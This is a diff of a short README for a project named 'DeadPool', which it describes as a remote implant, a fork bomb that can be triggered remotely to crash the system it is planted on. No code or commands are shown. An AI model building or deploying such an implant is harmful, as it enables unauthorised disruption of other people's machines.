@@ -1,2 +1,4 @@
 # DeadPool
-A remote implant that can crash machines immediately on run when triggered
+
+DeadPool is a ForkBomb once implanted successfully,can be triggered remotely to crash the system!
+
